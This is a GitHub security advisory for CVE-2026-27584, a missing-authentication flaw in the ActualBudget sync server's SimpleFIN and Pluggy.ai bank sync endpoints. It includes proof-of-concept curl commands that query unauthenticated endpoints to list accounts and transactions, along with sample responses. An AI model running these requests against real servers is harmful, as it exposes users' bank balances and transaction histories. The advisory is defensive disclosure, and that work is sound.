# [C] ActualBudget server is Missing Authentication for SimpleFIN and Pluggy AI bank sync endpoints

## Summary
Severity: Critical
Advisory: GHSA-m2cq-xjgm-f668
CVE: CVE-2026-27584
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-02-24
Source: https://github.com/advisories/GHSA-m2cq-xjgm-f668
Type: github-advisory

## Affected
- npm: `@actual-app/sync-server` — affected >=0 <26.2.1

## Details
### Summary

Missing authentication middleware in the ActualBudget server component allows any unauthenticated user to query the SimpleFIN and Pluggy.ai integration endpoints and read sensitive bank account balance and transaction information.

### Impact

This vulnerability allows an unauthenticated attacker to read the bank account balance and transaction history of ActualBudget users. This vulnerability impacts all ActualBudget Server users with the SimpleFIN or Pluggy.ai integrations configured. The ActualBudget Server instance must be reachable over the network.

### Details

The ActualBudget server component allows for integration with SimpleFIN and Pluggy.ai services. These services read bank account balances and transaction data from users' banks and return the data to ActualBudget. The affected endpoints facilitate this integration and are intended to be used only by logged in users for the purposes of syncing bank transaction data.

The vulnerable source code is in the following files in the `actualbudget/actual` GitHub repository (https://github.com/actualbudget/actual/):
* `/packages/sync-server/src/app-simplefin/app-simplefin.js`
* `/packages/sync-server/src/app-pluggyai/app-pluggyai.js`

The sensitive endpoints missing authentication are:
* `POST /simplefin/status`
* `POST /simplefin/accounts`
* `POST /simplefin/transactions`
* `POST /pluggyai/status`
* `POST /pluggyai/accounts`
* `POST /pluggyai/transactions`

The following source code is an example of an integration that implements the authentication middleware (`packages/sync-server/src/app-gocardless/app-gocardless.js`):
```js
const app = express();
app.use(requestLoggerMiddleware);
...
app.use(express.json());
app.use(validateSessionMiddleware); // <-- Uses authentication
```


### PoC

The below commands exploit this vulnerability on both the SimpleFIN and Pluggy.ai endpoints. No authentication is required. Network access is required.

SimpleFIN:
```bash
# Check if SimpleFIN is configured
curl -X POST "https://<actualbudgethost>/simplefin/status"

# List SimpleFIN accounts
curl -X POST "https://<actualbudgethost>/simplefin/accounts"

# List SimpleFIN transactions with an account ID from the previous request
curl -X POST "https://<actualbudgethost>/simplefin/transactions" -H "Content-Type: application/json" -d '{"accountId":["ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"],"startDate":["2026-02-01"]}'
```

PluggyAI:
```bash
# Check if PluggyAI is configured
curl -X POST "https://<actualbudgethost>/pluggyai/status"

# List Pluggy.ai accounts
curl -X POST "https://<actualbudgethost>/pluggyai/accounts"

# List Pluggy.ai transactions with an account ID from the previous request
curl -X POST "https://<actualbudgethost>/pluggyai/transactions" -H "Content-Type: application/json" -d '{"accountId":["ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"],"startDate":["2026-02-01"]}'
```

Example response from `POST /simplefin/accounts`:
```json
{
    "status": "ok",
    "data": {
        "accounts": [
            {
                "id": "ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX",
                "name": "CHEQUING ACCOUNT",
                "currency": "CAD",
                "balance": "1234.56",
                "available-balance": "0.00",
                "balance-date": 1771531758,
                "transactions": [],
                "holdings": [],
                "org": {
                    "domain": "www.cibc.com",
                    "name": "CIBC",
                    "sfin-url": "https://beta-bridge.simplefin.org/simplefin",
                    "url": "https://www.cibconline.cibc.com",
                    "id": "www.cibconline.cibc.com"
                }
            },
            ...
        ]
    }
}
```

Example response from `POST /simplefin/transactions`:
```json
{
    "status": "ok",
    "data": {
        "ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX": {
            "balances": [
                {
                    "balanceAmount": {
                        "amount": "1234.56",
                        "currency": "CAD"
                    },
                    "balanceType": "expected",
                    "referenceDate": "2026-02-19"
                },
                {
                    "balanceAmount": {
                        "amount": "1234.56",
                        "currency": "CAD"
                    },
                    "balanceType": "interimAvailable",
                    "referenceDate": "2026-02-19"
                }
            ],
            "startingBalance": 123456,
            "transactions": {
                "all": [
                    {
                        "booked": true,
                        "sortOrder": 1771502400,
                        "date": "2026-02-19",
                        "payeeName": "E-Transfer",
                        "notes": "SEND E-TFR ***ABC",
                        "transactionAmount": {
                            "amount": "-12.00",
                            "currency": "USD"
                        },
                        "transactionId": "TRN-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX",
                        "transactedDate": "2026-02-19",
                        "postedDate": "2026-02-19"
                    },
                    ...
                ],
                "pending": []
            }
        }
    }
}
```

## References
- https://github.com/actualbudget/actual/security/advisories/GHSA-m2cq-xjgm-f668
- https://nvd.nist.gov/vuln/detail/CVE-2026-27584
- https://github.com/actualbudget/actual/commit/ea937d100956ca56689ff852d99c28589e2a7d88
- https://github.com/actualbudget/actual
